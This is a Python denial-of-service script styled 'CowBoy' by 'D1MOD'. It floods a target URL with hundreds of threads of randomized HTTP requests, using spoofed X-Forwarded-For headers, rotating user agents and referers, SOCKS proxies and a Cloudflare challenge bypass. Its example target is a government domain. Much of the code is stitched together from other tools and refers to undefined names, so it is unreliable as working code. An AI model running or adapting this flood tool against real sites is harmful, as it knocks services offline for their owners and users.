import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
import datetime
import urllib2
import re
import os
import argparse
import logging


#global params                                                                                       
url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inc_counter():
	global request_counter
	request_counter+=45

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1
	
# generates a user agent array
def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)
#########################################DONT CHNAGE THIS
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(2200)
bytes1 = random._urandom(2900)
#########################################
def cloudflare_bypass(self, r):
        body = r.text
        scheme = re.search(r'^([\w]*)', r.url).group(1)
        domain = re.search(r'\/\/([^\/]*)', r.url).group(1)
        submit_url = '{}://{}/cdn-cgi/l/chk_jschl'.format(scheme, domain)
        jschl_vc = re.search(r'name="jschl_vc" value="(\w+)"', body).group(1)
        pas = re.search(r'name="pass" value="(.+?)"', body).group(1)
        jschl_answer = str(self.solve_challenge(body) + len(domain))
        time.sleep(5)
        return '{0}?jschl_vc={1}&pass={2}&jschl_answer={3}'.format(submit_url, jschl_vc, pas, jschl_answer)

ONE_BROWSER_QUERYS_LIMIT = 1500

ANTI_DDOS_SLEEP_SECS = 600

######################################## BLAZNING FAST BYPASSER
 
########################################### 
  
##################D1MOD FILE 
def Headers(method):
    header = ""
    if method == "get" or method == "head":
        connection = "Connection: Keep-Alive\r\n"
        accept = Choice(acceptall) + "\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = referer + useragent + accept + connection + "\r\n\r\n"
    elif method == "cookie":
        connection = "Connection: Keep-Alive\r\n"
        more = "cache-control: no-cache\r\n"
        parm = "pragma: no-cache\r\n"
        up = "upgrade-insecure-requests: 1"
        connection += "Cookies: " + str(secrets.token_urlsafe(16)) + "\r\n"
        accept = Choice(acceptall) + "\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = referer + useragent + accept + connection + more + up + parm + "\r\n\r\n"
    elif method == "brust":
        connection = "Connection: Keep-Alive\r\n"
        more = "Cache-Control: max-age=0\r\n"
        more2 = "Via: 1.0 PROXY\r\n"
        proxyd = str(proxy)
        xfor = "X-Forwarded-For: " + proxyd + "\r\n"
        accept = "Accept: */*\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = referer + useragent + accept + connection + more + xfor + more2 + "\r\n\r\n"
    elif method == "even":
        up = "Upgrade-Insecure-Requests: 1\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        proxyd = str(proxy)
        xfor = "X-Forwarded-For: " + proxyd + "\r\n"
        header = referer + useragent + up + xfor + "\r\n\r\n"
    elif method == "ovh":
        accept = Choice(acceptall) + "\r\n"
        more = "Connection: keep-alive\r\n"
        connection = "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        up = "Upgrade-Insecure-Requests: 1\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = useragent + more + accept + up + "\r\n\r\n"
    elif method == "pps":
        header = "GET / HTTP/1.1\r\n\r\n"
    elif method == "dyn":
        connection = "Connection: Keep-Alive\r\n"
        accept = Choice(acceptall) + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = referer + useragent + accept + connection + "\r\n\r\n"
    elif method == "socket":
        header = ""
    elif method == "null":
        connection = "Connection: null\r\n"
        accept = Choice(acceptall) + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        referer = "Referer: null\r\n"
        useragent = "User-Agent: null\r\n"
        header = referer + useragent + accept + connection + "\r\n\r\n"
    elif method == "post":
        post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        refer = "Referer: http://" + target + path + "\r\n"
        user_agent = "User-Agent: " + UserAgent + "\r\n"
        accept = Choice(acceptall) + "\r\n"
        connection = "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        data = str(random._urandom(8))
        length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
        header = post_host + accept + connection + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
    elif method == "hit":
        post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        refer = "Referer: http://" + target + path + "\r\n"
        user_agent = "User-Agent: " + UserAgent + "\r\n"
        connection = "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        accept = Choice(acceptall) + "\r\n"
        data = str(random._urandom(8))
        length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
        header = post_host + accept + connection + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
    return header
##################################################################################################
def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

#########################################################################
def ovh(event, socks_type):
    header = Headers("ovh")
    proxy = Choice(proxies).strip().split(":")
    get_host = "HEAD " + path + "/" + str(Intn(1111111111, 9999999999)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()
#####################################################
def run(self):
        while self.running:
            while self.running:
                try:
                    if self.tor:
                        self.socks.set_proxy(socks.SOCKS5, '127.0.0.1', 9150)
                        time.sleep(1)
                    self.socks.connect((self.host, self.port))
                    print(term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ term.NORMAL)
                    break
                except Exception as e:
                    print(term.BOL+term.UP+term.CLEAR_EOL+"Error connecting to host..."+ term.NORMAL)
                    print(e)
                    time.sleep(1)
                    sys.exit()

            while self.running:
                try:
                    self._send_http_post()
                except Exception as e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        print(term.BOL + term.UP + term.CLEAR_EOL + "Thread broken, restarting..." + term.NORMAL)
                        self.socks = socks.socksocket()
                        break
                    time.sleep(0.1)
                    pass

		
# generates a referer array
def referer_list():
	global headers_referers
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://www.bing.com/search?q=')
	headers_referers.append('http://search.yahoo.com/search?p=')
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.dmoz.org/search/search?q=')
	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('http://www.zhongsou.com/third?w=')
	headers_referers.append('http://hksearch.timway.com/search.php?query=')
	headers_referers.append('http://find.ezilon.com/search.php?q=')
	headers_referers.append('http://www.sogou.com/web?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	headers_referers.append('https://cloudfare.com')
	headers_referers.append('https://wordpress.org')
	headers_referers.append('http://' + host + '/')
	return(headers_referers)


 # Random no-cache entries/////////////////////////////////////////////////
        noCacheDirectives = ['no-cache', 'max-age=0']
        random.shuffle(noCacheDirectives)
        nrNoCache = random.randint(1, (len(noCacheDirectives)-1))
        noCache = ', '.join(noCacheDirectives[:nrNoCache])

        # Random accept encoding
        acceptEncoding = ['\'\'','*','identity','gzip','deflate']
        random.shuffle(acceptEncoding)
        nrEncodings = random.randint(1,int(len(acceptEncoding)/2))
        roundEncodings = acceptEncoding[:nrEncodings]

        http_headers = {
            'User-Agent': self.getUserAgent(),
            'Cache-Control': noCache,
            'Accept-Encoding': ', '.join(roundEncodings),
            'Connection': 'keep-alive',
            'Keep-Alive': random.randint(1,1000),
            'Host': self.host,
        }

def GenReqHeader(method):
	global data
	header = ""
	if method == "get" or method == "head":
		connection = "Connection: Keep-Alive\r\n"
		if cookies != "":
			connection += "Cookies: "+str(cookies)+"\r\n"
		accept = Choice(acceptall)
		referer = "Referer: "+Choice(referers)+ target + path + "\r\n"
		useragent = "User-Agent: " + getuseragent() + "\r\n"
		header =  referer + useragent + accept + connection + "\r\n"
	elif method == "post":
		post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
		content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
		refer = "Referer: http://"+ target + path + "\r\n"
		user_agent = "User-Agent: " + getuseragent() + "\r\n"
		accept = Choice(acceptall)
		if mode2 != "y":# You can enable customize data
			data = str(random._urandom(16))
		length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
		if cookies != "":
			length += "Cookies: "+str(cookies)+"\r\n"
		header = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
	return header




def ParseUrl(original_url):
	global target
	global path
	global port
	global protocol
	original_url = original_url.strip()
	url = ""
	path = "/"#default value
	port = 443 #default value
	protocol = "http"
	#http(s)://www.example.com:1337/xxx
	if original_url[:7] == "http://":
		url = original_url[7:]
	elif original_url[:8] == "https://":
		url = original_url[8:]
		protocol = "https"
	#http(s)://www.example.com:1337/xxx ==> www.example.com:1337/xxx
	#print(url) #for debug
	tmp = url.split("/")
	website = tmp[0]#www.example.com:1337/xxx ==> www.example.com:1337
	check = website.split(":")
	if len(check) != 1:#detect the port
		port = int(check[1])
	else:
		if protocol == "https":
			port = 443
	target = check[0]
	if len(tmp) > 1:
		path = url.replace(website,"",1)#get the path www.example.com/xxx ==> /xxx





# generates a Keyword list	
def keyword_list():
        global keyword_top
        keyword_top.append('HaxStroke')
        keyword_top.append('Suicide')
        keyword_top.append('Sex')
        keyword_top.append('Robin Williams')
        keyword_top.append('World Cup')
        keyword_top.append('Ca Si Le Roi')
        keyword_top.append('Ebola')
        keyword_top.append('Malaysia Airlines Flight 370')
        keyword_top.append('ALS Ice Bucket Challenge')
        keyword_top.append('Flappy Bird')
        keyword_top.append('Conchita Wurst')
        keyword_top.append('ISIS')
        keyword_top.append('Frozen')
        keyword_top.append('014 Sochi Winter Olympics')
        keyword_top.append('IPhone')
        keyword_top.append('Samsung Galaxy S5')
        keyword_top.append('Nexus 6')
        keyword_top.append('Moto G')
        keyword_top.append('Samsung Note 4')
        keyword_top.append('LG G3')
        keyword_top.append('Xbox One')
        keyword_top.append('Apple Watch')
        keyword_top.append('Nokia X')
        keyword_top.append('Ipad Air')
        keyword_top.append('Facebook')
        keyword_top.append('Anonymous')
        keyword_top.append('DJ Bach')

	
#builds random ascii string/////////////////////////////////////////////////////////////
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def usage():
	print 'CowBoy Version 1.7'
	print 'Author : D1MOD'
	print 'New loaded Botnets: 39,445,657'
	print 'Usage: python2 CowBoy.py (url)'
	print 'Example: python2 CowBoy.py https://gov.tr'
	print "\a"
print \
"""                                                       
                                  ###################
                              ###!!!!!!!!!!!!!!!!!!!####
                          ###!!!!!!!!!!!!!!!!!!!!!!!!!####
                        ##!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!###     
                     ###!!#####!!!!!!!!!!!!!!!!!!!!#####!!###
                   ##!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!###       
                  ##!!!!!!!!!#####!!!!!!!!!!!#####!!!!!!!!!##       
                ##!!!!!!!!!!######!!!!!!!!!!######!!!!!!!!!##       
               ##!!!!!!!!!!!####!!!!!!!!!!!!####!!!!!!!!!!!##       
              ##!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!##       
             ##!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!##
            ##!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!##
           ##!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!##
           ##!!!!!!!!!!!!##################!!!!!!!!!!!!!##
          ###!!!!!!!!!###!!!!!!!!!!!!!!!!!!##!!!!!!!!!!##
          ##!!!!!!!!!#!!!!!!!!!!!!!!!!!!!!!!##!!!!!!!!##
          ###!!!!!!#!!!!!!!!!!!!!!!!!!!!!!!##!!!!!!!##
          ###!!!!!#!!!!!!!!!!!!!!!!!!!!!!!!!##!!!!!##
           ###!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!##
            ###!!!!!!!!!!!!!!!!!!!!!CowBoy Version 1.7!##
             ###!!!!!!!!!!!!!!MADE BY D1MOD##
              ####!!!!!!!!!!!!!1877 TEAM UP###
                ####!!!!!!!!!!!!!!!!!###
                   #################                                                        
"""

	
#http request
def httpcall(url):
	useragent_list()
	referer_list()
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)####################request
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print 'ATTACKED BY D1MOD'
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

	
#http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "%d ATTACK BY D1MOD" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n-- CowBoy Attack Fnieshed --"

#execute 
if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	else:
		print "-- CowBoy Attack Started --"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
		if url.count("/")==2:
			url = url + "/"
		m = re.search('(https?\://)?([^/]*)/?.*', url)
		host = m.group(2)
		for i in range(500):
			t = HTTPThread()
			t.start()
		t = MonitorThread()
		t.start()
		t = MonitorThread()
		t.start()
		t = MonitorThread()
		t.start()
		t = MonitorThread()
		t.start()
		t = MonitorThread()
		t.start()
		t = MonitorThread()
		t.start()
		t = MonitorThread()
		t.start()
		t = MonitorThread()
		t.start()
		t = MonitorThread()
		t.start()
		t = MonitorThread()
		t.start()
		t = MonitorThread()
		t.start()
		
